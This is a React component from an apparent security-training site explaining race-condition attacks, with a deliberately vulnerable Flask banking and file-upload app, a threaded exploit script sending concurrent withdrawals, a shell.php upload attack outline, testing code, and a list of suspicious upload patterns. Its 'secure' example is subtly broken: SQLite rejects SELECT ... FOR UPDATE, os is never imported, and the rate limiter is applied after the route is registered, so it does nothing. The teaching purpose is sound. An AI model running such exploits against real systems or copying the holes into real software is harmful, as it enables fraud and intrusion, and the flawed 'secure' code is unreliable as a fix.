
import React from 'react';
import { Bug } from 'lucide-react';
import CodeExample from '@/components/CodeExample';

const RaceConditions: React.FC = () => {
  return (
    <section id="race" className="scroll-mt-20">
      <h3 className="text-2xl font-bold mb-6 border-b-2 border-cybr-primary inline-block pb-2">Race Conditions</h3>
      
      <div className="mb-8">
        <h4 className="text-xl font-semibold mb-4">What Attackers Try to Achieve</h4>
        <p className="mb-4">
          Race condition attacks exploit timing vulnerabilities in concurrent operations. Attackers targeting race conditions aim to:
        </p>
        <ul className="list-disc pl-6 space-y-2 mb-6">
          <li><strong>Financial Fraud</strong>: Exploit banking or e-commerce systems to withdraw more money than available</li>
          <li><strong>Privilege Escalation</strong>: Gain unauthorized administrative access through timing manipulation</li>
          <li><strong>Resource Exhaustion</strong>: Consume system resources beyond intended limits</li>
          <li><strong>Business Logic Bypass</strong>: Circumvent application controls and validation mechanisms</li>
          <li><strong>Data Corruption</strong>: Cause inconsistent or corrupted data states in databases</li>
          <li><strong>Authentication Bypass</strong>: Exploit timing windows in authentication processes</li>
        </ul>
      </div>

      <div className="mb-8">
        <h4 className="text-xl font-semibold mb-4">Vulnerable Components</h4>
        <ul className="list-disc pl-6 space-y-2 mb-6">
          <li><strong>Database Operations</strong>: Non-atomic read-then-write operations without proper locking</li>
          <li><strong>File System Operations</strong>: Concurrent file access without synchronization</li>
          <li><strong>Session Management</strong>: Parallel session creation or modification processes</li>
          <li><strong>Payment Processing</strong>: Multi-step financial transactions without proper isolation</li>
          <li><strong>Resource Allocation</strong>: Concurrent resource reservation systems</li>
          <li><strong>State Management</strong>: Shared application state without proper synchronization</li>
          <li><strong>Cache Systems</strong>: Concurrent cache updates without atomic operations</li>
        </ul>
      </div>

      <div className="mb-8">
        <h4 className="text-xl font-semibold mb-4">Why Race Condition Attacks Work</h4>
        <ul className="list-disc pl-6 space-y-2 mb-6">
          <li><strong>Time-of-Check to Time-of-Use (TOCTOU)</strong>: Gap between validation and action execution</li>
          <li><strong>Non-Atomic Operations</strong>: Operations that can be interrupted or interleaved</li>
          <li><strong>Inadequate Locking</strong>: Missing or improperly implemented synchronization mechanisms</li>
          <li><strong>Stateful Operations</strong>: Operations that depend on maintaining consistent state across steps</li>
          <li><strong>Concurrent Access Patterns</strong>: Multiple users or processes accessing shared resources simultaneously</li>
          <li><strong>Microservice Architecture</strong>: Distributed systems with eventual consistency models</li>
        </ul>
      </div>

      <div className="mb-8">
        <h4 className="text-xl font-semibold mb-4">Common Race Condition Attack Vectors</h4>
        
        <h5 className="text-lg font-medium mb-3">1. Banking/Financial Race Conditions</h5>
        <p className="mb-4">
          Exploiting timing windows in financial transactions to withdraw more funds than available.
        </p>
        <div className="bg-cybr-muted/30 p-4 rounded-lg mb-4">
          <p className="font-semibold mb-2">Attack Scenario:</p>
          <pre className="text-sm bg-cybr-muted p-2 rounded">
{`1. Attacker has $100 in account
2. Sends 10 simultaneous withdrawal requests for $100 each
3. All requests pass balance check before any updates balance
4. Attacker successfully withdraws $1000 from $100 account`}
          </pre>
        </div>

        <h5 className="text-lg font-medium mb-3">2. File Upload Race Conditions</h5>
        <p className="mb-4">
          Exploiting timing between file upload and validation to bypass security checks.
        </p>
        <div className="bg-cybr-muted/30 p-4 rounded-lg mb-4">
          <p className="font-semibold mb-2">Attack Process:</p>
          <pre className="text-sm bg-cybr-muted p-2 rounded">
{`1. Upload malicious file (e.g., shell.php)
2. Quickly access file before validation completes
3. Execute malicious code before file is removed
4. Gain system access or execute arbitrary commands`}
          </pre>
        </div>

        <h5 className="text-lg font-medium mb-3">3. Session Fixation Race Conditions</h5>
        <p className="mb-4">
          Exploiting timing in session management to hijack or elevate privileges.
        </p>
        <div className="bg-cybr-muted/30 p-4 rounded-lg mb-4">
          <p className="font-semibold mb-2">Exploitation Steps:</p>
          <pre className="text-sm bg-cybr-muted p-2 rounded">
{`1. Login with valid credentials
2. Simultaneously send privilege escalation requests
3. Exploit timing between authentication and authorization
4. Gain elevated privileges before session is properly established`}
          </pre>
        </div>
      </div>

      <div className="mb-8">
        <h4 className="text-xl font-semibold mb-4">Step-by-Step Exploitation Process</h4>
        
        <h5 className="text-lg font-medium mb-3">Phase 1: Identification and Reconnaissance</h5>
        <ol className="list-decimal pl-6 space-y-2 mb-4">
          <li>Identify endpoints that perform state-changing operations</li>
          <li>Map out multi-step processes (login, payment, file upload, etc.)</li>
          <li>Look for operations that involve checking then modifying resources</li>
          <li>Identify time-sensitive operations or validation processes</li>
          <li>Test application behavior under concurrent requests</li>
        </ol>

        <h5 className="text-lg font-medium mb-3">Phase 2: Timing Analysis</h5>
        <ol className="list-decimal pl-6 space-y-2 mb-4">
          <li>Measure response times for different operations</li>
          <li>Identify operations with noticeable processing delays</li>
          <li>Test with increasing levels of concurrency</li>
          <li>Monitor for inconsistent responses or error messages</li>
          <li>Document timing windows and vulnerable endpoints</li>
        </ol>

        <h5 className="text-lg font-medium mb-3">Phase 3: Exploitation</h5>
        <ol className="list-decimal pl-6 space-y-2 mb-4">
          <li>Craft multiple simultaneous requests targeting the same resource</li>
          <li>Use threading or parallel processing to achieve precise timing</li>
          <li>Monitor responses for successful exploitation indicators</li>
          <li>Adjust timing and concurrency levels based on results</li>
          <li>Verify successful exploitation through data validation</li>
        </ol>
      </div>

      <CodeExample 
        language="python" 
        isVulnerable={true}
        title="Vulnerable Banking System (Python/Flask)" 
        code={`from flask import Flask, request, jsonify
import sqlite3
import threading
import time

app = Flask(__name__)
DATABASE = 'bank.db'

def get_connection():
    conn = sqlite3.connect(DATABASE)
    conn.row_factory = sqlite3.Row
    return conn

@app.route('/api/withdraw', methods=['POST'])
def withdraw():
    user_id = request.json.get('user_id')
    amount = request.json.get('amount')
    
    if not user_id or not amount or amount <= 0:
        return jsonify({'error': 'Invalid request parameters'}), 400
    
    conn = get_connection()
    cursor = conn.cursor()
    
    # VULNERABILITY: Time-of-check to time-of-use (TOCTOU)
    # Step 1: Check current balance
    cursor.execute('SELECT balance FROM accounts WHERE user_id = ?', (user_id,))
    account = cursor.fetchone()
    
    if not account:
        conn.close()
        return jsonify({'error': 'Account not found'}), 404
    
    current_balance = account['balance']
    
    # Artificial delay to increase race condition window
    time.sleep(0.1)  # Simulates processing time
    
    # Step 2: Validate sufficient funds
    if current_balance < amount:
        conn.close()
        return jsonify({'error': 'Insufficient funds'}), 400
    
    # Step 3: Update balance (vulnerable window)
    new_balance = current_balance - amount
    cursor.execute(
        'UPDATE accounts SET balance = ? WHERE user_id = ?',
        (new_balance, user_id)
    )
    
    conn.commit()
    conn.close()
    
    return jsonify({
        'success': True, 
        'new_balance': new_balance,
        'withdrawn': amount
    })

# Example of vulnerable file upload with race condition
@app.route('/api/upload', methods=['POST'])
def upload_file():
    if 'file' not in request.files:
        return jsonify({'error': 'No file provided'}), 400
    
    file = request.files['file']
    filename = file.filename
    
    # Save file first (vulnerable)
    upload_path = f"uploads/{filename}"
    file.save(upload_path)
    
    # Validate file after saving (race condition window)
    if not validate_file(upload_path):
        os.remove(upload_path)  # Too late - file already accessible
        return jsonify({'error': 'Invalid file type'}), 400
    
    return jsonify({'success': True, 'filename': filename})

def validate_file(filepath):
    # Slow validation process
    time.sleep(0.5)
    allowed_extensions = ['.jpg', '.png', '.pdf']
    return any(filepath.endswith(ext) for ext in allowed_extensions)`} 
      />

      <div className="mb-6">
        <p className="font-semibold mb-2">Attack Script for Banking Vulnerability:</p>
        <div className="bg-red-900/20 p-4 rounded-lg">
          <pre className="text-sm">
{`import requests
import threading
import json

# Exploit script for concurrent withdrawal attack
def exploit_race_condition():
    target_url = "http://localhost:5000/api/withdraw"
    user_id = "victim_user"
    withdraw_amount = 100  # User only has $100
    
    def send_withdrawal():
        payload = {
            "user_id": user_id,
            "amount": withdraw_amount
        }
        response = requests.post(target_url, json=payload)
        print(f"Response: {response.status_code} - {response.text}")
    
    # Send 10 simultaneous requests
    threads = []
    for i in range(10):
        thread = threading.Thread(target=send_withdrawal)
        threads.append(thread)
    
    # Start all threads simultaneously
    for thread in threads:
        thread.start()
    
    # Wait for all threads to complete
    for thread in threads:
        thread.join()

exploit_race_condition()`}
          </pre>
        </div>
      </div>
      
      <CodeExample 
        language="python" 
        isVulnerable={false}
        title="Secure Banking Implementation" 
        code={`from flask import Flask, request, jsonify
import sqlite3
import threading
from contextlib import contextmanager
import uuid
import time

app = Flask(__name__)
DATABASE = 'bank.db'

# Thread-safe connection pool
connection_lock = threading.Lock()

@contextmanager
def get_db_transaction():
    """Context manager for database transactions with proper locking"""
    conn = sqlite3.connect(DATABASE, timeout=30.0)
    conn.row_factory = sqlite3.Row
    conn.execute('BEGIN IMMEDIATE')  # Acquire write lock immediately
    try:
        yield conn
        conn.commit()
    except Exception as e:
        conn.rollback()
        raise e
    finally:
        conn.close()

@app.route('/api/withdraw', methods=['POST'])
def withdraw_secure():
    user_id = request.json.get('user_id')
    amount = request.json.get('amount')
    
    if not user_id or not amount or amount <= 0:
        return jsonify({'error': 'Invalid request parameters'}), 400
    
    try:
        with get_db_transaction() as conn:
            cursor = conn.cursor()
            
            # Lock the account row for update (prevents concurrent access)
            cursor.execute('''
                SELECT balance, version FROM accounts 
                WHERE user_id = ? 
                FOR UPDATE
            ''', (user_id,))
            
            account = cursor.fetchone()
            
            if not account:
                return jsonify({'error': 'Account not found'}), 404
            
            current_balance = account['balance']
            current_version = account['version']
            
            # Atomic check and update within same transaction
            if current_balance < amount:
                return jsonify({'error': 'Insufficient funds'}), 400
            
            new_balance = current_balance - amount
            new_version = current_version + 1
            
            # Update with version check (optimistic locking)
            cursor.execute('''
                UPDATE accounts 
                SET balance = ?, version = ?, last_updated = datetime('now')
                WHERE user_id = ? AND version = ?
            ''', (new_balance, new_version, user_id, current_version))
            
            if cursor.rowcount == 0:
                return jsonify({'error': 'Concurrent modification detected'}), 409
            
            # Log transaction for audit
            transaction_id = str(uuid.uuid4())
            cursor.execute('''
                INSERT INTO transactions (id, user_id, type, amount, balance_after)
                VALUES (?, ?, 'withdrawal', ?, ?)
            ''', (transaction_id, user_id, amount, new_balance))
            
            return jsonify({
                'success': True,
                'transaction_id': transaction_id,
                'new_balance': new_balance,
                'withdrawn': amount
            })
            
    except sqlite3.OperationalError as e:
        if 'database is locked' in str(e):
            return jsonify({'error': 'System busy, please try again'}), 503
        raise e

# Secure file upload implementation
@app.route('/api/upload_secure', methods=['POST'])
def upload_file_secure():
    if 'file' not in request.files:
        return jsonify({'error': 'No file provided'}), 400
    
    file = request.files['file']
    original_filename = file.filename
    
    # Generate secure filename
    file_id = str(uuid.uuid4())
    temp_filename = f"{file_id}.tmp"
    temp_path = f"temp/{temp_filename}"
    
    try:
        # Save to temporary location first
        file.save(temp_path)
        
        # Validate file before making it accessible
        if not validate_file_secure(temp_path):
            os.remove(temp_path)
            return jsonify({'error': 'Invalid file type'}), 400
        
        # Only after validation, move to final location
        final_filename = f"{file_id}_{original_filename}"
        final_path = f"uploads/{final_filename}"
        os.rename(temp_path, final_path)
        
        return jsonify({
            'success': True, 
            'file_id': file_id,
            'filename': final_filename
        })
        
    except Exception as e:
        # Cleanup on error
        if os.path.exists(temp_path):
            os.remove(temp_path)
        return jsonify({'error': 'Upload failed'}), 500

def validate_file_secure(filepath):
    """Comprehensive file validation"""
    import magic  # python-magic library for proper file type detection
    
    # Check file size
    if os.path.getsize(filepath) > 10 * 1024 * 1024:  # 10MB limit
        return False
    
    # Check actual file type (not just extension)
    file_type = magic.from_file(filepath, mime=True)
    allowed_types = ['image/jpeg', 'image/png', 'application/pdf']
    
    if file_type not in allowed_types:
        return False
    
    # Additional security checks
    with open(filepath, 'rb') as f:
        header = f.read(1024)
        # Check for suspicious content patterns
        suspicious_patterns = [b'<?php', b'<script', b'eval(']
        if any(pattern in header for pattern in suspicious_patterns):
            return False
    
    return True

# Rate limiting to prevent abuse
from functools import wraps
from collections import defaultdict

request_counts = defaultdict(list)

def rate_limit(max_requests=5, window=60):
    def decorator(f):
        @wraps(f)
        def wrapper(*args, **kwargs):
            client_ip = request.remote_addr
            now = time.time()
            
            # Clean old requests
            request_counts[client_ip] = [
                req_time for req_time in request_counts[client_ip]
                if now - req_time < window
            ]
            
            # Check rate limit
            if len(request_counts[client_ip]) >= max_requests:
                return jsonify({'error': 'Rate limit exceeded'}), 429
            
            request_counts[client_ip].append(now)
            return f(*args, **kwargs)
        return wrapper
    return decorator

# Apply rate limiting to sensitive endpoints
withdraw_secure = rate_limit(max_requests=3, window=60)(withdraw_secure)`} 
      />

      <div className="mb-8">
        <h4 className="text-xl font-semibold mb-4">Testing for Race Condition Vulnerabilities</h4>
        
        <h5 className="text-lg font-medium mb-3">Manual Testing Steps</h5>
        <ol className="list-decimal pl-6 space-y-2 mb-4">
          <li><strong>Identify Target Operations</strong>
            <ul className="list-disc pl-6 mt-2 space-y-1">
              <li>Look for endpoints that modify critical data (balance, permissions, etc.)</li>
              <li>Find multi-step processes (authentication flows, payment processing)</li>
              <li>Identify file upload and processing endpoints</li>
              <li>Locate resource allocation or reservation systems</li>
            </ul>
          </li>
          <li><strong>Concurrent Request Testing</strong>
            <ul className="list-disc pl-6 mt-2 space-y-1">
              <li>Send multiple identical requests simultaneously</li>
              <li>Vary timing between requests to find optimal windows</li>
              <li>Test with different payload combinations</li>
              <li>Monitor for inconsistent responses or data states</li>
            </ul>
          </li>
          <li><strong>State Verification</strong>
            <ul className="list-disc pl-6 mt-2 space-y-1">
              <li>Check database consistency after concurrent operations</li>
              <li>Verify business logic constraints are maintained</li>
              <li>Look for orphaned or inconsistent records</li>
              <li>Test error handling under concurrent load</li>
            </ul>
          </li>
        </ol>

        <h5 className="text-lg font-medium mb-3">Automated Testing Tools</h5>
        <ul className="list-disc pl-6 space-y-2 mb-4">
          <li><strong>Burp Suite</strong>: Intruder with thread settings for concurrent requests</li>
          <li><strong>OWASP ZAP</strong>: Fuzzer with concurrent request capabilities</li>
          <li><strong>Custom Scripts</strong>: Python threading, asyncio, or multiprocessing</li>
          <li><strong>Artillery.js</strong>: Load testing tool for concurrent request scenarios</li>
          <li><strong>Race the Web</strong>: Specialized tool for race condition testing</li>
          <li><strong>Postman</strong>: Collection runner with parallel execution</li>
        </ul>

        <h5 className="text-lg font-medium mb-3">Testing Script Example</h5>
        <div className="bg-cybr-muted/30 p-4 rounded-lg mb-4">
          <pre className="text-sm">
{`import asyncio
import aiohttp
import time

async def test_race_condition(url, payload, num_requests=10):
    """Test for race conditions using async requests"""
    
    async def send_request(session):
        try:
            start_time = time.time()
            async with session.post(url, json=payload) as response:
                end_time = time.time()
                text = await response.text()
                return {
                    'status': response.status,
                    'response': text,
                    'time': end_time - start_time
                }
        except Exception as e:
            return {'error': str(e)}
    
    # Send all requests concurrently
    async with aiohttp.ClientSession() as session:
        tasks = [send_request(session) for _ in range(num_requests)]
        results = await asyncio.gather(*tasks)
    
    # Analyze results
    success_count = sum(1 for r in results if r.get('status') == 200)
    print(f"Successful requests: {success_count}/{num_requests}")
    
    # Look for inconsistencies
    responses = [r.get('response') for r in results if 'response' in r]
    unique_responses = set(responses)
    if len(unique_responses) > 1:
        print("⚠️  Inconsistent responses detected - possible race condition")
    
    return results`}
          </pre>
        </div>
      </div>

      <div className="mb-8">
        <h4 className="text-xl font-semibold mb-4">Prevention and Secure Implementation</h4>
        
        <h5 className="text-lg font-medium mb-3">Database-Level Solutions</h5>
        <ul className="list-disc pl-6 space-y-2 mb-4">
          <li><strong>Database Transactions</strong>: Use ACID transactions with appropriate isolation levels</li>
          <li><strong>Row-Level Locking</strong>: SELECT FOR UPDATE to lock specific records</li>
          <li><strong>Optimistic Locking</strong>: Version numbers or timestamps to detect concurrent modifications</li>
          <li><strong>Pessimistic Locking</strong>: Lock resources before accessing them</li>
          <li><strong>Atomic Operations</strong>: Use database-level atomic operations when possible</li>
        </ul>

        <h5 className="text-lg font-medium mb-3">Application-Level Solutions</h5>
        <ul className="list-disc pl-6 space-y-2 mb-4">
          <li><strong>Mutex/Semaphores</strong>: Synchronization primitives for critical sections</li>
          <li><strong>Queue Systems</strong>: Serialize operations through message queues</li>
          <li><strong>Idempotency</strong>: Design operations to be safely repeatable</li>
          <li><strong>Two-Phase Commit</strong>: For distributed transaction consistency</li>
          <li><strong>Rate Limiting</strong>: Prevent excessive concurrent requests from same source</li>
        </ul>

        <h5 className="text-lg font-medium mb-3">Architecture-Level Solutions</h5>
        <ul className="list-disc pl-6 space-y-2 mb-4">
          <li><strong>Event Sourcing</strong>: Append-only event logs for state changes</li>
          <li><strong>CQRS</strong>: Separate read and write models for better control</li>
          <li><strong>Distributed Locks</strong>: Redis, Zookeeper for distributed systems</li>
          <li><strong>Saga Pattern</strong>: Manage distributed transactions with compensation</li>
        </ul>
      </div>

      <div className="mb-8">
        <h4 className="text-xl font-semibold mb-4">Environment-Specific Considerations</h4>
        
        <div className="mb-4">
          <h6 className="font-medium mb-2">Development Environment</h6>
          <ul className="list-disc pl-6 space-y-1">
            <li>Use tools like ThreadSanitizer or Helgrind to detect race conditions</li>
            <li>Implement comprehensive unit tests with concurrent scenarios</li>
            <li>Use database isolation level testing</li>
            <li>Simulate network delays and processing time</li>
          </ul>
        </div>

        <div className="mb-4">
          <h6 className="font-medium mb-2">Production Environment</h6>
          <ul className="list-disc pl-6 space-y-1">
            <li>Monitor for data inconsistencies and audit trail gaps</li>
            <li>Implement circuit breakers for overloaded systems</li>
            <li>Use distributed tracing to track concurrent operations</li>
            <li>Set up alerts for unusual concurrent access patterns</li>
          </ul>
        </div>

        <div className="mb-4">
          <h6 className="font-medium mb-2">Cloud/Microservices Environment</h6>
          <ul className="list-disc pl-6 space-y-1">
            <li>Use cloud-native locking mechanisms (DynamoDB conditional writes, etc.)</li>
            <li>Implement eventual consistency patterns appropriately</li>
            <li>Use service mesh for request correlation and tracing</li>
            <li>Leverage managed queue services for operation serialization</li>
          </ul>
        </div>
      </div>

      <div className="mb-8">
        <h4 className="text-xl font-semibold mb-4">Special Cases and Advanced Scenarios</h4>
        
        <h5 className="text-lg font-medium mb-3">Time-Based Race Conditions</h5>
        <p className="mb-4">
          Exploiting system clock synchronization issues or time-based validation logic.
        </p>
        
        <h5 className="text-lg font-medium mb-3">Memory-Based Race Conditions</h5>
        <p className="mb-4">
          Targeting shared memory structures in applications or system-level vulnerabilities.
        </p>
        
        <h5 className="text-lg font-medium mb-3">Signal Handler Race Conditions</h5>
        <p className="mb-4">
          Exploiting race conditions in signal handling, particularly in C/C++ applications.
        </p>

        <h5 className="text-lg font-medium mb-3">Distributed System Race Conditions</h5>
        <p className="mb-4">
          Targeting consistency issues across multiple services or data centers.
        </p>
      </div>
    </section>
  );
};

export default RaceConditions;
